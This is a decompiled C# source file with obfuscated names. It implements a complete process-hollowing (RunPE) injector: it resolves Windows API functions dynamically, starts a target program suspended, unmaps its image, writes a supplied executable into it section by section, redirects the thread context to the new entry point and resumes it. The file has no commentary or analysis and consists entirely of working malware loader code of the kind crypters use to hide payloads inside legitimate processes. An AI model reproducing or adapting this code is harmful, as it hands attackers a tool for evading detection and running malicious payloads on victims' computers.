using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;

namespace ns0;

public class GClass0
{
	public struct GStruct0
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public GStruct1 gstruct1_0;

		public uint uint_7;

		public uint uint_8;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		public uint uint_19;

		public uint uint_20;

		public uint uint_21;

		public uint uint_22;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] byte_0;
	}

	public struct GStruct1
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] byte_0;

		public uint uint_7;
	}

	public struct GStruct2
	{
		public uint uint_0;

		public uint uint_1;
	}

	public struct GStruct3
	{
		public byte byte_0;

		public GStruct2 gstruct2_0;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;
	}

	public struct GStruct4
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public int int_0;

		public int int_1;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct GStruct5
	{
		public int int_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public int int_8;

		public short short_0;

		public short short_1;

		public int int_9;

		public int int_10;

		public int int_11;

		public int int_12;
	}

	public struct GStruct6
	{
		public int int_0;

		public IntPtr intptr_0;

		public int int_1;
	}

	public struct GStruct7
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public ushort ushort_7;

		public ushort ushort_8;

		public ushort ushort_9;

		public ushort ushort_10;

		public ushort ushort_11;

		public ushort ushort_12;

		public ushort ushort_13;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ushort_14;

		public ushort ushort_15;

		public ushort ushort_16;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ushort_17;

		public int int_0;
	}

	public struct GStruct8
	{
		public uint uint_0;

		public GStruct9 gstruct9_0;

		public GStruct10 gstruct10_0;
	}

	public struct GStruct9
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public ushort ushort_2;

		public ushort ushort_3;
	}

	public struct GStruct10
	{
		public ushort ushort_0;

		public byte byte_0;

		public byte byte_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public ushort ushort_7;

		public ushort ushort_8;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public GStruct11[] gstruct11_0;
	}

	public struct GStruct11
	{
		public uint uint_0;

		public uint uint_1;
	}

	public delegate bool GDelegate0(string name, string command, ref GStruct6 process, ref GStruct6 thread, bool inherit, uint flags, IntPtr system, string current, [In] ref GStruct5 startup, out GStruct4 info);

	public delegate bool GDelegate1(IntPtr process, int address, byte[] buffer, int size, out int written);

	public delegate int GDelegate2(IntPtr process, int address, ref int buffer, int size, ref int read);

	public delegate IntPtr GDelegate3(IntPtr process, int address, uint size, uint type, uint protect);

	public delegate long GDelegate4(IntPtr process, int address);

	public delegate uint GDelegate5(IntPtr thread);

	public delegate bool GDelegate6(IntPtr thread, ref GStruct0 context);

	public delegate bool GDelegate7(IntPtr thread, ref GStruct0 context);

	public const long long_0 = 512L;

	public const long long_1 = 64L;

	public const long long_2 = 128L;

	public const long long_3 = 32L;

	public const long long_4 = 16L;

	public const long long_5 = 8L;

	public const long long_6 = 1L;

	public const long long_7 = 4L;

	public const uint uint_0 = 2u;

	[DebuggerNonUserCode]
	public GClass0()
	{
	}

	public static void smethod_0(byte[] byte_0, string string_0)
	{
		GStruct0 context = default(GStruct0);
		GStruct4 info = default(GStruct4);
		GStruct5 startup = default(GStruct5);
		GStruct6 process = default(GStruct6);
		GStruct6 thread = default(GStruct6);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), default(GStruct7).GetType());
		GStruct7 gStruct = default(GStruct7);
		GStruct7 gStruct2 = ((obj != null) ? ((GStruct7)obj) : gStruct);
		gCHandle.Free();
		GDelegate0 gDelegate = smethod_1<GDelegate0>("kernel32", "CreateProcessA");
		GDelegate6 gDelegate2 = smethod_1<GDelegate6>("kernel32", "GetThreadContext");
		GDelegate2 gDelegate3 = smethod_1<GDelegate2>("kernel32", "ReadProcessMemory");
		GDelegate1 gDelegate4 = smethod_1<GDelegate1>("kernel32", "WriteProcessMemory");
		GDelegate4 gDelegate5 = smethod_1<GDelegate4>("ntdll", "ZwUnmapViewOfSection");
		GDelegate3 gDelegate6 = smethod_1<GDelegate3>("kernel32", "VirtualAllocEx");
		GDelegate7 gDelegate7 = smethod_1<GDelegate7>("kernel32", "SetThreadContext");
		GDelegate5 gDelegate8 = smethod_1<GDelegate5>("kernel32", "ResumeThread");
		IntPtr system = default(IntPtr);
		if (0 - (gDelegate(null, string_0, ref process, ref thread, inherit: false, 4u, system, null, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		GStruct8 gStruct3 = default(GStruct8);
		IntPtr ptr = new IntPtr(checked(num + gStruct2.int_0));
		object? obj2 = Marshal.PtrToStructure(ptr, gStruct3.GetType());
		GStruct8 gStruct4 = default(GStruct8);
		gStruct3 = ((obj2 != null) ? ((GStruct8)obj2) : gStruct4);
		startup.int_0 = Strings.Len((object)startup);
		context.uint_0 = 65539u;
		if ((((long)gStruct3.uint_0 != 17744L) | (gStruct2.ushort_0 != 23117)) || 0 - (gDelegate(null, string_0, ref process, ref thread, inherit: false, 4u, system, null, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		gDelegate2(info.intptr_1, ref context);
		IntPtr intptr_ = info.intptr_0;
		checked
		{
			int address = (int)(unchecked((long)context.uint_13) + 8L);
			long num2 = default(long);
			int buffer = (int)num2;
			int read = 0;
			gDelegate3(intptr_, address, ref buffer, 4, ref read);
			num2 = buffer;
			gDelegate5(info.intptr_0, (int)num2);
			uint num3 = (uint)(int)gDelegate6(info.intptr_0, (int)gStruct3.gstruct10_0.uint_6, gStruct3.gstruct10_0.uint_10, 12288u, 4u);
			if (unchecked((long)num3) == 0L)
			{
				return;
			}
			IntPtr intptr_2 = info.intptr_0;
			int address2 = (int)num3;
			int size = (int)gStruct3.gstruct10_0.uint_11;
			uint num4 = default(uint);
			read = (int)num4;
			gDelegate4(intptr_2, address2, byte_0, size, out read);
			num4 = (uint)read;
			long num5 = gStruct2.int_0 + 248;
			int num6 = unchecked((int)gStruct3.gstruct9_0.ushort_1) - 1;
			int num7 = 0;
			GStruct3 gStruct5 = default(GStruct3);
			GStruct3 gStruct6 = default(GStruct3);
			while (true)
			{
				int num8 = num7;
				int num9 = num6;
				if (num8 > num9)
				{
					break;
				}
				ptr = new IntPtr(num + num5 + num7 * 40);
				object? obj3 = Marshal.PtrToStructure(ptr, gStruct5.GetType());
				gStruct5 = ((obj3 != null) ? ((GStruct3)obj3) : gStruct6);
				byte[] array = new byte[(int)gStruct5.uint_1 + 1];
				int num10 = (int)(unchecked((long)gStruct5.uint_1) - 1L);
				int num11 = 0;
				while (true)
				{
					int num12 = num11;
					num9 = num10;
					if (num12 > num9)
					{
						break;
					}
					array[num11] = byte_0[(int)(unchecked((long)gStruct5.uint_2) + unchecked((long)num11))];
					num11++;
				}
				IntPtr intptr_3 = info.intptr_0;
				int address3 = (int)(num3 + gStruct5.uint_0);
				int size2 = (int)gStruct5.uint_1;
				read = (int)num4;
				gDelegate4(intptr_3, address3, array, size2, out read);
				num4 = (uint)read;
				num7++;
			}
			byte[] bytes = BitConverter.GetBytes(num3);
			IntPtr intptr_4 = info.intptr_0;
			int address4 = (int)(unchecked((long)context.uint_13) + 8L);
			read = (int)num4;
			gDelegate4(intptr_4, address4, bytes, 4, out read);
			num4 = (uint)read;
			context.uint_16 = num3 + gStruct3.gstruct10_0.uint_3;
			gDelegate7(info.intptr_1, ref context);
			gDelegate8(info.intptr_1);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	private static T smethod_1<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
	}
}
